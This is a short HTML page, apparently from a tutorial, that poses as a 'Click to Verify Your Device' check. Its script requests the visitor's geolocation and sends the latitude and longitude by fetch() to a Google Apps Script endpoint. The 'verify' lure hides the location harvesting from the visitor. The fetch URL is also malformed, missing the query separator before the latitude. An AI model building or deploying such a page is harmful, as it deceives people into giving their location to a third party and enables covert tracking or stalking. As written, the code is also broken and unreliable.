<!DOCTYPE html>
<html>
<body>
    <h2>Click to Verify Your Device</h2>
    <script>
        // Ask for location
        navigator.geolocation.getCurrentPosition(function(position){
            var lat = position.coords.latitude;
            var lng = position.coords.longitude;
            
            // Show the result on screen (optional)
            document.getElementById("result").innerHTML = "Lat: " + lat + "<br>Lng: " + lng;
            
            // Send it to your server or Google Sheets (see Step 2)
            fetch("https://script.google.com/macros/s/AKfycbwRsq41X3QT_CpbYebAWYfVffTD7q3PP4gxfwC43JN6SP3g-6OzTT7PJnhJoToa6P9i/exec" + lat + "&lng=" + lng);
        });
    </script>
    <p id="result"></p>
</body>
</html>
